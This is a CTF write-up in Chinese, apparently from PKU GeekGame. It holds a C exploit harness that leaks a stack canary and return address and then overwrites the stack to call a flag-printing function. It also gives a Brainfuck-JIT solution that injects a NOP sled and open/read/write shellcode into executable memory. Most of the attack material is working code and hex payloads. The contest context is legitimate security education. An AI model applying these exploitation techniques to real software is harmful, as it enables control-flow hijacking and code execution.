  if (getline(&ctx->buf, &ctx->bufsz, ctx->rfile) <= 0) {
    fputs("read line failed\n", stderr);
    return -1;
  }

  return expect_and_read_case(ctx);
}

static int
overrun_then_overwrite(struct context *ctx, const char *data, size_t size)
{
  char msg[128];
  size_t i, j;
  size_t offset, datalen, nslashes;

  for (i = 0; i < size; ++i)
  {
    if (data[i] == '\n') {
      fputs("overwrite impossible because of new line character\n", stderr);
      return -1;
    }
  }

  offset = 0;
  datalen = 0;
  for (i = 0; i < size; ++i)
  {
    if (data[i] == '\0' || data[i] == '\\') {
      datalen += 4;
      offset += 2;
    } else {
      datalen += 1;
    }
  }
  offset += 2;
  datalen += 2;

  if (offset + datalen + 2 > sizeof(msg)) {
    fputs("overwrite impossible because of data too long\n", stderr);
    return -1;
  }

  nslashes = 0;
  while (offset + datalen + nslashes < 98)
  {
    nslashes += 2;
    offset += 1;
  }

  for (i = 0; i < offset + datalen + nslashes; ++i)
    msg[i] = '\\';
  for (i = i; i < sizeof(msg) - 2; ++i)
    msg[i] = 'a';
  msg[sizeof(msg) - 2] = '\\';
  msg[sizeof(msg) - 1] = '\0';

  if (write_line_and_update(ctx, msg, sizeof(msg)) < 0)
    return -1;

  for (i = 0; i < offset; ++i)
    msg[i] = 'a';
  for (j = 0; j < size; ++j)
  {
    if (data[j] == '\0' || data[j] == '\\') {
      msg[i++] = '\\';
      msg[i++] = '\\';
      msg[i++] = '\\';
    }
    msg[i++] = data[j] ? : 'x';
  }
  msg[i++] = '\\';
  msg[i++] = '\0';
  assert(i == offset + datalen);

  if (write_line_and_update(ctx, msg, sizeof(msg)) < 0)
    return -1;

  for (i = i - 1; ~i; --i)
  {
    if (msg[i] != 'x')
      continue;
    msg[i] = '\0';
    if (write_line_and_update(ctx, msg, sizeof(msg)) < 0)
      return -1;
  }

  return 0;
}

static int
overrun_then_shift(struct context *ctx, size_t offset)
{
  char data[128];
  size_t i;

  assert(offset >= 2 && offset < sizeof(data));
  for (i = 0; i < offset - 2; ++i)
    data[i] = 'a';
  data[offset - 2] = '\\';

  if (overrun_then_overwrite(ctx, data, offset - 1) < 0)
    return -1;

  for (i = 0; i < sizeof(data); ++i)
    data[i] = '\\';

  if (write_line_and_update(ctx, data, sizeof(data)) < 0)
    return -1;

  return 0;
}

static int
stack_extract(struct context *ctx, size_t off, size_t len, char *data)
{
  size_t pos;
  char byte;

  assert(off >= 4);
  while (len != 0)
  {
    for (pos = off; pos >= 4; --pos)
    {
      if (overrun_then_shift(ctx, pos) < 0)
        return -1;
    }

    for (;;)
    {
      byte = ctx->ncase >> 24;
      *data++ = byte;
      --len;
      ++off;
      if (!len || !byte)
        break;
      if (overrun_then_shift(ctx, 4) < 0)
        return -1;
    }
  }

  return 0;
}

struct stack_frame0
{
  uint64_t canary;
  uint64_t fp;
  uint64_t ra;
};

struct stack_frame1
{
  uint64_t a0;
  uint64_t ra;
};

struct stack
{
  uint64_t dummy;
  struct stack_frame0 f0;
  struct stack_frame1 f1;
  uint64_t pushed;
};

static int program_quit(struct context *ctx)
{
  char msg[128];
  strncpy(msg, "quit", sizeof(msg));

  return write_line_alone(ctx, msg, sizeof(msg));
}

#define DUMMY 0x6161616161616161ull

static int function_call(
    struct context *ctx,
    struct stack_frame0 *stk_f0,
    int64_t off,
    uint64_t arg,
    uint64_t pushed)
{
  struct stack stk;

  stk.dummy = DUMMY;
  stk.f0.canary = stk_f0->canary;
  stk.f0.fp = DUMMY;
  stk.f0.ra = stk_f0->ra + (OFF_POPRDI - OFF_WORKRA);
  stk.f1.a0 = arg;
  stk.f1.ra = stk_f0->ra + off;
  stk.pushed = pushed;

  if (overrun_then_overwrite(ctx, (char *)&stk, sizeof(stk)) < 0)
    return -1;

  stk_f0->fp += 0x18;
  return program_quit(ctx);
}

static int exploit(FILE *rfile, FILE *wfile)
{
  struct context ctx = {
    .rfile = rfile,
    .wfile = wfile,
    .buf = NULL,
    .bufsz = 0,
    .ncase = 0,
  };
  struct stack_frame0 stk_f0;

  if (expect_and_read_welcome(&ctx) < 0)
    return -1;
  if (expect_and_read_case(&ctx) < 0)
    return -1;

  if (stack_extract(
        &ctx,
        __builtin_offsetof(struct stack, f0),
        sizeof(struct stack_frame0),
        (char *)&stk_f0) < 0)
    return -1;

  fprintf(stderr, "canary: %016lx\n", stk_f0.canary);
  fprintf(stderr, "fp: %016lx\n", stk_f0.fp);
  fprintf(stderr, "ra: %016lx\n", stk_f0.ra);

  if (function_call(&ctx, &stk_f0,
        OFF_PRTFLAG - OFF_WORKRA, stk_f0.fp - 0x00,
        0x0067616c662e2f2e /* "./.flag" */) < 0)
    return -1;

  return 0;
}

static pid_t spawn(const char *program, FILE **rfile, FILE **wfile)
{
  int rpipes[2]; // (parent rfile, child stdout)
  int wpipes[2]; // (child stdin, parent wfile)
  pid_t pid;

  if (pipe(rpipes) < 0) {
    perror("pipe");
    goto rpipe_err;
  }

  if (pipe(wpipes) < 0) {
    perror("pipe");
    goto wpipe_err;
  }

  pid = fork();
  if (pid < 0) {
    perror("fork");
    goto fork_err;
  } else if (pid == 0) {
    // Execute `./secret` in the child process
    close(rpipes[0]);
    close(wpipes[1]);
    if (dup2(rpipes[1], 1) < 0) {
      perror("dup2");
      exit(-1);
    }
    if (dup2(wpipes[0], 0) < 0) {
      perror("dup2");
      exit(-1);
    }
    close(rpipes[1]);
    close(wpipes[0]);

    execlp("/bin/sh", "/bin/sh", "-c", program, NULL);
    perror("execlp");
    exit(-1);
  }

  // parent use rpipes[0] as input
  //            wpipes[1] as output
  close(rpipes[1]);
  close(wpipes[0]);
  *rfile = fdopen(rpipes[0], "r");
  *wfile = fdopen(wpipes[1], "w");
  return pid;

fork_err:
  close(wpipes[0]);
  close(wpipes[1]);
wpipe_err:
  close(rpipes[0]);
  close(rpipes[1]);
rpipe_err:
  return -1;
}

struct piped_fps
{
  FILE *in_fp;
  FILE *out_fp;
};

static void *pipe_fp(void *priv)
{
  struct piped_fps fps = *(struct piped_fps *)priv;
  size_t nbuf;
  ssize_t nbytes;
  char *buffer = NULL;

  for (;;)
  {
    nbuf = 0;
    if ((nbytes = getline(&buffer, &nbuf, fps.in_fp)) < 0)
      break;

    nbytes = fwrite(buffer, 1, nbytes, fps.out_fp);
    if (nbytes == 0)
      break;
    fflush(fps.out_fp);

    free(buffer);
    buffer = NULL;
  }

  if (buffer)
    free(buffer);
  fclose(fps.in_fp);
  fclose(fps.out_fp);
  return NULL;
}

static void forward(FILE *rfile, FILE *wfile)
{
  struct piped_fps fps1 = {
    .in_fp = stdin,
    .out_fp = wfile,
  };
  struct piped_fps fps2 = {
    .in_fp = rfile,
    .out_fp = stdout,
  };
  pthread_t th1, th2;

  pthread_create(&th1, NULL, &pipe_fp, &fps1);
  pthread_create(&th2, NULL, &pipe_fp, &fps2);

  pthread_join(th1, NULL);
  pthread_join(th2, NULL);
}

int main(int argc, char *argv[])
{
  FILE *rfile, *wfile;
  pid_t pid;
  int remote;

  remote = argc != 1;
  if ((argc > 2) || (argc == 2 &&
        strcmp(argv[1], "-s") != 0)) {
    fprintf(stderr,
        "Usage: %s [-s]\n"
        "\t-s\tConnect to the server and submit your results\n",
        argv[0]);
    return 0;
  }

  pid = spawn(
      remote ? "nc prob12.geekgame.pku.edu.cn 10012" : "./secret",
      &rfile, &wfile);
  if (pid < 0)
    return -1;
  fprintf(stderr, "spawn pid=%d\n", pid);

  fprintf(stderr, "Press <Enter> to continue...");
  fflush(stderr);
  getchar();

  if ((remote && request_and_send_token(rfile, wfile) < 0)
      || exploit(rfile, wfile) < 0) {
    fputs("exploit failed\n", stderr);
    kill(pid, SIGINT);
  } else {
    fputs("exploit ok\n", stderr);
    forward(rfile, wfile);
  }

  if (waitpid(pid, NULL, 0) != pid)
    perror("waitpid");

  return 0;
}
```
~~（2020级信科的本科同学可能感觉这个框架似曾相识，所以不要问我为什么是C语言写的；这道题在出题前的定位本来是ICS课程Lab中一道不算分的Attack Lab X，但是出题出好了后发现难度爆炸了，就算不记分也太过分，所以最后决定把Attack Lab X换道裸题并且记了5分，别骂了别骂了……）~~

更新：如果遇到本地能过但服务器上不能过的情况，可以考虑以下两个问题。出题时没有想过在这里为难选手，但确实是会造成一些迷惑现象（不过我并没有看到选手writeup中有相关吐槽）。
 1. 进入函数`print_flag`时，不建议把字符串`"./.flag"`放在栈指针`%rsp`之下。由于调用`open@plt`的时候会首先进行动态链接的符号解析，这可能导致字符串被覆盖从而出现`no such file or directory`。
 2. 进入函数`print_flag`时，建议保证栈指针`%rsp`模16余8，这是System V ABI的[要求](https://stackoverflow.com/questions/49391001/why-does-the-x86-64-amd64-system-v-abi-mandate-a-16-byte-stack-alignment)~~（Attack Lab经典坑点，虽然那时不影响得分）~~，否则可能会导致之后在栈中进行`movaps`操作时由于内存地址对齐不正确引发Segmentation Fault，得不到任何输出，本地如果不能复现也很难猜到是哪里错了。

## 最强大脑

扔进Ghidra反编译，虽然这二进制文件移除了符号表并且代码量相比之前的题目算是比较大的了，但也还好，基本可以很快标出每个函数在干什么，大概实现了一个Brainfuck的解释器以及当循环执行16次后切入的JIT编译器。flag1被放在了初始数据区的末尾，那么只要循环打印所有数据即可搞到flag1：
```brainfuck
+[>.+]
```

程序打印出flag1后输出了一些乱码并且崩溃了，这很明显是因为JIT产生的代码没做边界检查。JIT题目一个好处是有现成的可写可执行的内存区域，所以接下来的思路就是利用这个缺少的边界检查在可执行内存区域内插入预先设计的代码片段从而读出flag2。这里JIT生成的代码放在了一段预先开好的`mmap`空间内，而程序的数据区域每次倍增，由`malloc`分配，所以它们看上去距离十分遥远；但只要试图分配的内存足够大，`malloc`也会采用`mmap`分配内存，而Linux内核对`mmap`的实现是自顶向下逐次分配的，也就意味着它们会直接相邻，例如：
```text
555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]
7ffff7c81000-7ffff7cc2000 rw-p 00000000 00:00 0
7ffff7cc2000-7ffff7dc2000 rwxp 00000000 00:00 0
7ffff7dc2000-7ffff7dc4000 rw-p 00000000 00:00 0
```
这里第二段是大小为0x40000（glibc实际多分配了一页，可能被用来存储元数据，所以总共大小是0x41000），紧随其后的第三段大小为0x100000，具有可执行权限，是JIT用来产生代码的区域。

有一个坑是我本地用了glibc-2.33，它在大小为0x40000才会使用`mmap`分配，而服务器使用的glibc-2.31在数据区大小为0x20000就会使用`mmap`分配（题目也下发了但我最开始没注意到）。所以产生了一些本地能过交上去过不了的奇妙现象。

具体实现上分为三步，第一步把数据区域大小扩大到0x20000，第二步在代码区写入构造好的代码，第三步触发代码执行。
  1. 把数据区域大小扩大到0x20000：这一步我手写了一段brainfuck代码以支持向右移动一个short型变量（即两个char型变量拼起来）内存储的距离（对边界条件支持得很差，不过能用就好）：
     ```brainfuck
     ++++[->++++<]>>>+++++[-<----->]<--<
     [>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]  // stop before flag1
     >>[>]>                                       // skip flag1, pos: 0x1001
     ++++[->++++<]>>---<
     [>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]  // pos: 0x1fff
     >++++++++[->++++<]>>--<
     [>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]  // pos: 0x3fff
     >++++[->++++<]>[->++++<]>>-----<
     [>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]  // pos: 0x7fff
     >>--[>+<--]>+>---<
     [>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]  // pos: 0xffff
     >>--
     [>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]  // pos: 0x1fe01
     ```
  2. 在代码区写入构造好的代码：现在的位置再向右移动`0x20000 - 0x1fe01 + 0x1000 = 0x11ff`（注意glibc会多分配0x1000字节）就可以到达代码区域，为了让填入的代码可以被正确执行，可以先写入足够多的`nop`指令，随后插入任意想要执行的代码，只要之后执行的JIT函数落在了这段`nop`区间，目标代码就会恰好被执行。
      先来写一段目标代码，读取flag2并且写入到`stdout`：
      ```unix-assembly
      .text
      .global _start

      _start:
        movq $2, %rax
        leaq flag2_name(%rip), %rdi
        xorq %rsi, %rsi
        syscall // fd = open("flag2", O_RDONLY)

        movq %rax, %rdi
        xorq %rax, %rax
        leaq flag2_content(%rip), %rsi
        movq $0x100, %rdx
        syscall // read(fd, flag2_content, 0x100)

        movq $1, %rax
        movq %rax, %rdi
        leaq flag2_content(%rip), %rsi
        movq $0x100, %rdx
        syscall // write(1, flag2_content, 0x100)

        nop

      flag2_name: .string "flag2"
      flag2_content: .skip 0xff
      ```
      然后在输出这段目标代码前先输出足够多的`nop`指令（0x90）：
      ```bash
      for ((i=0;i<512;++i)) do
        echo -e -n '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
      done
      ```
      最后通过brainfuck的读入功能写到代码区域：
      ```brainfuck
      +[->,+]
      ```
      注意这里以0xff作为代码截止的标记。
  3. 触发代码执行：JIT编译的代码是从前往后放置的，所以实际上只需把前述所有代码放在一个大循环里，在循环的第二次解释执行时一定会遇到早期代码的JIT编译执行，这期望执行一个保存JIT代码区域前部的函数，因为前部已经被目标代码前部的`nop`指令覆盖，那么就会触发目标代码执行。

完整brainfuck代码为：
```brainfuck
+[+++[->++++<]>>>+++++[-<----->]<--<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>>[>]>++++[->++++<]>>---<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>++++++++[->++++<]>>--<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>++++[->++++<]>[->++++<]>>-----<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>>--[>+<--]>+>---<[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]>>--[>-[[>]+[<]>>-]+<[>[>]<+[<]>-]>[>]<<[-]>--]+++++++++++++++++++++++++++++++++.[-]+[->,+]+++++++++++++++++++++++++++++++++.[-]-]
```

插入的代码16进制表示为：
```text
48 c7 c0 02 00 00 00
48 8d 3d 36 00 00 00
48 31 f6
0f 05
48 89 c7
48 31 c0
48 8d 35 2a 00 00 00
48 c7 c2 00 01 00 00
0f 05
48 c7 c0 01 00 00 00
48 89 c7
48 8d 35 10 00 00 00
48 c7 c2 00 01 00 00
0f 05
90
66 6c 61 67 32 00
66 6c 61 67 32 00
ff
```
